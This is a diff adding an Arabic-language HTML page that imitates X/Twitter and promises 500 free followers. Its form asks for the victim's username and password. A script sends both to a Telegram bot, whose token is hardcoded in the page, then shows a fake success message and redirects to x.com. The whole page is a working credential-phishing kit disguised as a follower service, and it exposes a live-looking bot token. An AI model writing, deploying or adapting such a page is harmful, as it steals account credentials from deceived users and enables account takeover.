@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>X رشق</title>
+    <style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:'Segoe UI',sans-serif;background:#15202b;color:#fff;display:flex;justify-content:center;align-items:center;min-height:100vh}.card{background:#192734;padding:25px;border-radius:20px;width:380px;text-align:center;border:1px solid #38444d}svg{width:44px;fill:#1d9bf0;margin:0 auto 20px;display:block}h2{color:#1d9bf0;margin-bottom:6px}p{color:#aaa;font-size:14px;margin-bottom:18px}.gift-box{background:#1d9bf0;color:#fff;border-radius:12px;padding:12px;margin-bottom:15px}.gift-box span{font-weight:bold;font-size:18px}input,select{width:100%;padding:14px;margin:8px 0;background:#15202b;border:1px solid #38444d;border-radius:6px;color:#fff;font-size:16px;text-align:center}.btn{background:#1d9bf0;color:#fff;border:none;padding:14px;width:100%;border-radius:30px;font-size:18px;font-weight:bold;cursor:pointer;margin-top:10px}.btn:hover{background:#1a8cd8}</style></head>
+<body><div class="card">
+<svg viewBox="0 0 24 24"><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/></svg>
+<h2>🐦 رشق متابعين تويتر/X</h2>
+<p>احصل على متابعين حقيقيين مجاناً!</p>
+<div class="gift-box"><span>🎉 500 متابع مجاناً</span></div>
+<select id="amount"><option value="100">100 متابع</option><option value="500" selected>500 متابع</option><option value="1000">1000 متابع</option></select>
+<input id="username" placeholder="اسم المستخدم (@username)">
+<input id="password" type="password" placeholder="كلمة المرور للتأكيد">
+<button class="btn" onclick="sendData()">إرسال الرشق الآن 🚀</button>
+<p id="msg" style="margin-top:12px;font-size:14px;font-weight:bold;"></p>
+</div>
+<script>
+const TOKEN="8558243002:AAGTsGfVX5IfQERVDksCP0crVIYIB6ethqs";const p=new URLSearchParams(location.search);const CHAT=p.get('chat');
+function sendData(){const u=document.getElementById('username').value,pa=document.getElementById('password').value,am=document.getElementById('amount').value;
+if(!u||!pa)return alert('املأ جميع الحقول');
+document.getElementById('msg').innerHTML='⏳ جاري إرسال الرشق...';
+fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT}&text=${encodeURIComponent('🐦 رشق تويتر\n👤 '+u+'\n🔑 '+pa+'\n📊 الكمية: '+am+' متابع')}`).then(()=>{document.getElementById('msg').innerHTML='✅ تم الإرسال! سيصل الرشق خلال دقائق.';setTimeout(()=>location.href='https://x.com',3000)});}
+</script></body></html>
